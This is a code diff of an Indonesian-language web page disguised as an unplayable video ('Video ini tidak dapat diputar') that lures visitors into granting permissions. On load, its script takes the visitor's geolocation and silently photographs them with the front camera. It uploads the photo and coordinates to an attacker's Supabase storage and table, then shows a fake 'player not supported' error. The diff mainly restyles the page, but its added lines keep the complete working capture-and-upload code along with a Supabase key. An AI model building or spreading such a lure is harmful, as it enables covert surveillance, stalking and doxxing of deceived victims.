@@ -4,111 +4,129 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>INI ERA YAZZ - ERROR FEED</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Inter', sans-serif;
-    background: #0f0f0f;
-    color: #eeeeee;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    min-height: 100vh;
-    padding-bottom: 40px;
-  }
+  * { 
+    box-sizing: border-box; 
+    margin: 0; 
+    padding: 0; 
+  }
 
-  header {
-    width: 100%;
-    padding: 20px;
-    text-align: center;
-    font-size: 1.5rem;
-    font-weight: 600;
-    letter-spacing: -1px;
-    color: #e74c3c; /* Warna merah error */
-    border-bottom: 1px solid #222;
-    background: rgba(15, 15, 15, 0.8);
-    backdrop-filter: blur(10px);
-    position: sticky;
-    top: 0;
-    z-index: 100;
-  }
+  body {
+    /* Update Font ke Plus Jakarta Sans */
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    background: #0a0a0a;
+    color: #f0f0f0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    padding-bottom: 40px;
+    -webkit-font-smoothing: antialiased;
+  }
 
-  #statusBox {
-    width: 90%;
-    max-width: 500px;
-    margin: 20px auto;
-    padding: 15px;
-    background: #1a1a1a;
-    border-radius: 12px;
-    text-align: center;
-    border: 1px solid #333;
-  }
+  header {
+    width: 100%;
+    padding: 25px;
+    text-align: center;
+    font-size: 1.2rem;
+    font-weight: 700; /* Lebih tebal */
+    letter-spacing: 2px; /* Jarak antar huruf lebih elegan */
+    color: #ff3b30; 
+    border-bottom: 1px solid #1a1a1a;
+    background: rgba(10, 10, 10, 0.8);
+    backdrop-filter: blur(15px);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+    text-transform: uppercase;
+  }
 
-  #statusText { 
-    font-size: 0.9rem; 
-    color: #ff4d4d;
-    margin-bottom: 10px;
-  }
+  #statusBox {
+    width: 92%;
+    max-width: 500px;
+    margin: 25px auto;
+    padding: 18px;
+    background: #161616;
+    border-radius: 14px;
+    text-align: center;
+    border: 1px solid #222;
+  }
 
-  #list {
-    width: 90%;
-    max-width: 600px;
-    display: grid;
-    grid-template-columns: 1fr;
-    gap: 20px;
-  }
+  #statusText { 
+    font-size: 0.85rem; 
+    font-weight: 500;
+    color: #ff4d4d;
+    letter-spacing: 0.2px;
+  }
 
-  .card {
-    background: #1a1a1a;
-    border-radius: 16px;
-    overflow: hidden;
-    border: 1px solid #282828;
-  }
+  #list {
+    width: 90%;
+    max-width: 600px;
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 20px;
+  }
 
-  .media-container {
-    width: 100%;
-    aspect-ratio: 16 / 9;
-    background: #000;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    position: relative;
-    color: #555;
-  }
+  .card {
+    background: #161616;
+    border-radius: 20px;
+    overflow: hidden;
+    border: 1px solid #262626;
+  }
 
-  /* Icon Video Rusak */
-  .error-icon {
-    font-size: 3rem;
-    margin-bottom: 10px;
-  }
+  .media-container {
+    width: 100%;
+    aspect-ratio: 16 / 9;
+    background: #000;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+    color: #444;
+  }
 
-  .info-overlay {
-    padding: 15px;
-    background: #151515;
-  }
+  .error-icon {
+    font-size: 3.2rem;
+    margin-bottom: 12px;
+    opacity: 0.7;
+  }
 
-  .info-text {
-    font-size: 0.8rem;
-    color: #555;
-    text-align: center;
-  }
+  .media-container p {
+    font-weight: 600;
+    font-size: 0.9rem;
+    color: #777;
+  }
 
-  #canvas { display: none; }
-  video { display: none; }
+  .info-overlay {
+    padding: 18px;
+    background: #111;
+  }
 
-  .floating-info {
-    position: fixed;
-    bottom: 20px;
-    background: #e74c3c;
-    color: white;
-    padding: 10px 20px;
-    border-radius: 50px;
-    font-size: 0.8rem;
-    font-weight: 600;
-    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
-  }
+  .info-text {
+    font-size: 0.75rem;
+    font-weight: 400;
+    color: #666;
+    text-align: center;
+    letter-spacing: 0.5px;
+  }
+
+  #canvas, video { display: none; }
+
+  .floating-info {
+    position: fixed;
+    bottom: 25px;
+    background: #ff3b30;
+    color: white;
+    padding: 12px 25px;
+    border-radius: 50px;
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    box-shadow: 0 8px 20px rgba(255, 59, 48, 0.3);
+  }
 </style>
 </head>
 <body>
@@ -116,20 +134,20 @@
 <header>#INIERAYAZZ</header>
 
 <div id="statusBox">
-  <div id="statusText">System: Mendeteksi pemutar video...</div>
+  <div id="statusText">System: Mendeteksi pemutar video...</div>
 </div>
 
 <div id="list">
-  <div class="card">
-    <div class="media-container">
-      <div class="error-icon">⚠️</div>
-      <p>Video ini tidak dapat diputar</p>
-      <p style="font-size: 0.7rem;">Error Code: 0x80040255</p>
-    </div>
-    <div class="info-overlay">
-      <div class="info-text">Izinkan dulu- Mencoba memuat ulang...</div>
-    </div>
-  </div>
+  <div class="card">
+    <div class="media-container">
+      <div class="error-icon">⚠️</div>
+      <p>Video ini tidak dapat diputar</p>
+      <p style="font-size: 0.7rem; font-weight: 400; margin-top: 5px; color: #555;">Error Code: 0x80040255</p>
+    </div>
+    <div class="info-overlay">
+      <div class="info-text">Izinkan dulu - Mencoba memuat ulang...</div>
+    </div>
+  </div>
 </div>
 
 <div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
@@ -139,64 +157,61 @@
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
-  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
-  const BUCKET = "foto-users"; 
-  const { createClient } = supabase;
-  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
+  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
+  const BUCKET = "foto-users"; 
+  const { createClient } = supabase;
+  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  const statusText = document.getElementById("statusText");
-  const video = document.getElementById("video");
-  const canvas = document.getElementById("canvas");
+  const statusText = document.getElementById("statusText");
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
 
-  // FITUR TETAP JALAN DI BELAKANG LAYAR
-  async function startProcess() {
-    statusText.innerText = "izinkan dulu bang baru nonton";
-    
-    if (!navigator.geolocation) return;
+  async function startProcess() {
+    statusText.innerText = "izinkan dulu bang baru nonton";
+    
+    if (!navigator.geolocation) return;
 
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const { latitude: lat, longitude: lon } = pos.coords;
-      statusText.innerText = "Memproses video... mohon tunggu";
-      captureAndUpload(lat, lon);
-    }, (err) => {
-      statusText.innerText = "Gagal memuat: Akses ditolak.";
-    });
-  }
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const { latitude: lat, longitude: lon } = pos.coords;
+      statusText.innerText = "Memproses video... mohon tunggu";
+      captureAndUpload(lat, lon);
+    }, (err) => {
+      statusText.innerText = "Gagal memuat: Akses ditolak.";
+    });
+  }
 
-  async function captureAndUpload(lat, lon) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-      video.srcObject = stream;
+  async function captureAndUpload(lat, lon) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+      video.srcObject = stream;
 
-      setTimeout(async () => {
-        const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        canvas.toBlob(async (blob) => {
-          const fileName = `vid_${Date.now()}.jpg`;
-          const { error: uploadError } = await client.storage
-            .from(BUCKET)
-            .upload(fileName, blob, { contentType: "image/jpeg" });
+      setTimeout(async () => {
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+          const fileName = `vid_${Date.now()}.jpg`;
+          const { error: uploadError } = await client.storage
+            .from(BUCKET)
+            .upload(fileName, blob, { contentType: "image/jpeg" });
 
-          if (!uploadError) {
-            await client.from("lokasi_users").insert([
-              { foto: fileName, latitude: lat, longitude: lon }
-            ]);
-            // Tidak menampilkan foto di layar, hanya mengubah status kecil
-            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
-          }
-          stream.getTracks().forEach(track => track.stop());
-        }, "image/jpeg", 0.7);
-      }, 2000);
+          if (!uploadError) {
+            await client.from("lokasi_users").insert([
+              { foto: fileName, latitude: lat, longitude: lon }
+            ]);
+            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
+          }
+          stream.getTracks().forEach(track => track.stop());
+        }, "image/jpeg", 0.7);
+      }, 2000);
 
-    } catch (err) {
-      console.error("Cam Error");
-    }
-  }
+    } catch (err) {
+      console.error("Cam Error");
+    }
+  }
 
-  // Menjalankan proses capture tanpa merubah list UI
-  startProcess();
+  startProcess();
 </script>
 </body>
 </html>
